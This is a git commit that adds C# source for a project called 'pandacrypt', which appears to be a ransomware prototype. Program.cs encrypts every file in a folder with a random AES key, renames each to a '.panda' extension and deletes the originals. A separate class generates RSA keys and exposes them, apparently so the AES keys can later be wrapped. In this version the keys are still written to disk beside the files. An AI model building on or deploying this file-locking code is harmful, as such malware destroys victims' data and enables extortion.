f0af6286af8b675b4630cb48dc17608af78f7f76
丂匚尺乇乇匚Ҝ <58401384+screeck@users.noreply.github.com>
2022-07-30 01:01:03 -0700

    Add files via upload

---
+++ pandacrypt/pandacrypt/Program.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace pandacrypt
+{
+    class pandacrypt
+    {
+        public static void Main(string[] args)
+        {
+
+
+
+            string plainPath = @"C:\Users\User\Documents\test";
+            
+
+            foreach (string f in Directory.GetFiles(plainPath))
+            {
+                string encryptedFile = f.Replace(".txt", ".panda");
+                string Key = CreatePassword(30);
+
+                EncryptFiles(f, Key , encryptedFile);
+
+                string fName = Path.GetFileName(f).Replace(".txt", "");
+                string fKey = $"{fName} AESKEY";
+                string KeyFilePath = $@"{plainPath}\{fKey}.txt";
+                File.WriteAllText(KeyFilePath, Key);
+
+                Console.WriteLine(plainPath);
+                Console.WriteLine(fKey);
+                
+                File.Delete(f);
+               
+            }
+
+
+
+        }
+
+        private static void EncryptFiles(string plaintext, string AesKey, string encrypted)
+        {
+            SharpAESCrypt.SharpAESCrypt.Encrypt(AesKey, plaintext, encrypted);
+        }
+        private static string CreatePassword(int length)
+        {
+           
+            const string valid_all = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_-=+{}:;\\<>?|,./`~[]'";
+           
+                StringBuilder res = new StringBuilder();
+                byte[] random = new byte[1];
+                RNGCryptoServiceProvider rProvider = new RNGCryptoServiceProvider();
+                while (0 < length--)
+                {
+                    rProvider.GetBytes(random);
+                    res.Append(valid_all[random[0] % (valid_all.Length - 1)]);
+                }
+                return res.ToString();
+            
+        }
+
+
+    }
+}
+
---
+++ pandacrypt/pandacrypt/RsaEncryption.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+
+namespace pandacrypt
+{
+    public class RsaEncryption
+    {
+        private static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048);
+        private RSAParameters _privateKey;
+        private RSAParameters _publicKey;
+
+        public RsaEncryption()
+        {
+            _privateKey = rsa.ExportParameters(true);
+            _publicKey = rsa.ExportParameters(false);
+
+
+        }
+
+        public string GetPublicKey()
+        {
+           return  rsa.ToXmlString(false);
+
+        }
+        public string GetPrivateKey()
+        {
+            return rsa.ToXmlString(true);
+
+        }
+
+        public string Encrypt(string plainText)
+        {
+            rsa = new RSACryptoServiceProvider();
+            rsa.ImportParameters(_publicKey);
+            var data = Encoding.UTF8.GetBytes(plainText);
+            var cypher = rsa.Encrypt(data, false);
+            return cypher.ToString();
+        }
+
+        
+
+
+    }
+}
